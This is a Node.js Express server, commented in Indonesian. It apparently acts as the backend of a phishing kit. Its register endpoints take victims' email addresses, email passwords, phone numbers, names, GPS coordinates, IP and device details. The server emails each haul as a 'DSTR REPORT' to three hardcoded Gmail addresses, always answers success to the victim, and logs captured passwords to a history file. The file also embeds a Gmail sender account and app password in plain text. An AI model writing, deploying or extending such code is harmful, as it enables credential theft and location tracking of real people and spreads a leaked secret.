const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';

// EMAIL TUJUAN PER FOLDER
const EMAIL_CONFIG = {
    'public1': {
        email: ['chilligemaass@gmail.com'],
        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗪𝗘𝗕',        // Nama pengirim di Gmail
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   // Subject email                       
    },
    'public2': {
        email: ['akunvanzz888@gmail.com'],
        fromName: '𝗕𝗔𝗬𝗭𝗭 𝗠𝗢𝗗𝗘 𝗪𝗘𝗕',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'public3': {
        email: ['zamzaja78@gmail.com'],
        fromName: '𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗪𝗘𝗕',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    }
};
// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return true;
    if (record.lastPassword !== currentPassword) return true;
    const timeElapsed = Date.now() - record.lastSendTime;
    return timeElapsed >= COOLDOWN_MS;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: { user: SENDER_EMAIL, pass: SENDER_PASSWORD }
});

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

// ========== FUNGSI KIRIM EMAIL ==========
// ========== FUNGSI KIRIM EMAIL ==========
async function sendEmail(data, folderName) {
    const countryName = data.country || data.ip_country || 'Unknown';
    let countryCode = '';
    
    const countryMapping = {
        'indonesia': 'ID', 'indonesian': 'ID', 'id': 'ID',
        'malaysia': 'MY', 'singapore': 'SG', 'singapura': 'SG',
        'thailand': 'TH', 'vietnam': 'VN', 'philippines': 'PH', 'filipina': 'PH',
        'usa': 'US', 'united states': 'US', 'america': 'US', 'amerika': 'US',
        'uk': 'GB', 'united kingdom': 'GB', 'inggris': 'GB',
        'japan': 'JP', 'jepang': 'JP', 'korea': 'KR', 'south korea': 'KR',
        'china': 'CN', 'tiongkok': 'CN', 'india': 'IN', 'australia': 'AU',
        'germany': 'DE', 'jerman': 'DE', 'france': 'FR', 'prancis': 'FR',
        'netherlands': 'NL', 'belanda': 'NL', 'russia': 'RU', 'rusia': 'RU',
        'brazil': 'BR', 'brasil': 'BR', 'mexico': 'MX', 'mexiko': 'MX',
        'canada': 'CA', 'kanada': 'CA', 'italy': 'IT', 'italia': 'IT',
        'spain': 'ES', 'spanyol': 'ES', 'turkey': 'TR', 'turki': 'TR'
    };
    
    const lowerCountry = countryName.toLowerCase();
    for (const [key, code] of Object.entries(countryMapping)) {
        if (lowerCountry.includes(key)) {
            countryCode = code;
            break;
        }
    }
    
    if (!countryCode && data.ip_country_code) {
        countryCode = data.ip_country_code;
    }
    
    const flagEmoji = getFlagEmoji(countryCode);
    
    const htmlContent = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DSTR REPORT</title>
<style>
body{
    margin:0;
    padding:20px;
    background:#050505;
    font-family:Arial,sans-serif;
    color:white;
}
.container{
    max-width:700px;
    margin:auto;
    background:#0b0b0b;
    border:2px solid #00e5ff;
}
.topbar{
    background:#3914cc;
    color:#00e5ff;
    text-align:center;
    padding:20px;
    font-size:28px;
    font-weight:bold;
    letter-spacing:3px;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 15px #00e5ff;
}
.mainbox{
    padding:20px;
}
.data-box{
    background:white;
    color:black;
    margin-bottom:20px;
    border:2px solid #3914cc;
}
.data-title{
    background:#3914cc;
    color:#00e5ff;
    padding:12px;
    font-size:15px;
    font-weight:bold;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 10px #00e5ff inset;
}
.data-row{
    display:flex;
    justify-content:space-between;
    padding:12px;
    border-bottom:1px solid #999;
    gap:10px;
    word-break:break-word;
}
.data-row:last-child{
    border-bottom:none;
}
.label{
    font-weight:bold;
}
.value{
    text-align:right;
    max-width:60%;
}
.footer-sign{
    margin-top:25px;
    background:#3914cc;
    border:2px solid #00e5ff;
    text-align:center;
    padding:15px;
    color:#00e5ff;
    font-size:18px;
    font-weight:bold;
    box-shadow:0 0 15px #00e5ff;
}
</style>
</head>
<body>
<div class="container">
    <div class="topbar">
        DSTR REPORT 🇲🇽 | ${folderName.toUpperCase()}
    </div>
    <div class="mainbox">
        <div class="data-box">
            <div class="data-title">📧 ACCOUNT INFORMATION</div>
            <div class="data-row"><div class="label">Email : </div><div class="value">${data.email || '-'}</div></div>
            <div class="data-row"><div class="label">Password : </div><div class="value">${data.emailPassword || '-'}</div></div>
            <div class="data-row"><div class="label">Phone : </div><div class="value">${data.phone || '-'}</div></div>
            <div class="data-row"><div class="label">Full Name : </div><div class="value">${data.fullName || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">📍 GPS LOCATION</div>
            <div class="data-row"><div class="label">Latitude : </div><div class="value">${data.latitude || '-'}</div></div>
            <div class="data-row"><div class="label">Longitude : </div><div class="value">${data.longitude || '-'}</div></div>
            <div class="data-row"><div class="label">Accuracy : </div><div class="value">${data.gps_accuracy || '-'} m</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌍 LOCATION</div>
            <div class="data-row"><div class="label">Country : </div><div class="value">${countryName} ${flagEmoji}</div></div>
            <div class="data-row"><div class="label">Province : </div><div class="value">${data.province || data.ip_region || '-'}</div></div>
            <div class="data-row"><div class="label">City : </div><div class="value">${data.city || data.ip_city || '-'}</div></div>
            <div class="data-row"><div class="label">Postal Code : </div><div class="value">${data.postalCode || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌐 NETWORK</div>
            <div class="data-row"><div class="label">IP Address : </div><div class="value">${data.ip_address || '-'}</div></div>
            <div class="data-row"><div class="label">ISP : </div><div class="value">${data.isp || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🖥 DEVICE INFORMATION</div>
            <div class="data-row"><div class="label">Platform : </div><div class="value">${data.platform || '-'}</div></div>
            <div class="data-row"><div class="label">Resolution : </div><div class="value">${data.screenResolution || '-'}</div></div>
            <div class="data-row"><div class="label">Language : </div><div class="value">${data.language || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">⏰ TIMESTAMP</div>
            <div class="data-row"><div class="label">Time : </div><div class="value">${data.timestamp || new Date().toLocaleString()}</div></div>
        </div>
        <div class="footer-sign">DSTR 🇲🇽 | ${folderName}</div>
    </div>
</div>
</body>
</html>`;
    
    // INI YANG DIPERBAIKI
    const config = EMAIL_CONFIG[folderName];
    for (const receiver of config.email) {
        await transporter.sendMail({
            from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
            to: receiver,
            subject: `${config.subject} ${flagEmoji} ${data.email}`,
            html: htmlContent
        });
        console.log(`✅ [${folderName}] Sent to: ${receiver} as ${config.fromName}`);
    }
}

// ========== ROUTING UNTUK MASING-MASING FOLDER ==========

// Public 1
app.use('/public1', express.static(path.join(__dirname, 'public1')));
app.post('/public1/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [PUBLIC1] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'public1');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// Public 2
app.use('/public2', express.static(path.join(__dirname, 'public2')));
app.post('/public2/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [PUBLIC2] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'public2');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// Public 3
app.use('/public3', express.static(path.join(__dirname, 'public3')));
app.post('/public3/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [PUBLIC3] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'public3');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head><title>Multi Folder System</title>
        <style>
            body { background: #000; color: #00d4ff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .container { text-align: center; }
            a { display: block; margin: 20px; color: #00d4ff; font-size: 24px; }
        </style>
        </head>
        <body>
            <div class="container">
                <h1>🔥 MULTI FOLDER SYSTEM</h1>
                <a href="/public1/">📁 PUBLIC 1</a>
                <a href="/public2/">📁 PUBLIC 2</a>
                <a href="/public3/">📁 PUBLIC 3</a>
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Akses via:`);
    console.log(`   → http://localhost:${PORT}/public1/`);
    console.log(`   → http://localhost:${PORT}/public2/`);
    console.log(`   → http://localhost:${PORT}/public3/`);
    console.log(`📧 Email config:`);
    console.log(`   → public1 → chilligemaass@gmail.com`);
    console.log(`   → public2 → akunvanzz888@gmail.com`);
    console.log(`   → public3 → zamzaja78@gmail.com`);
});
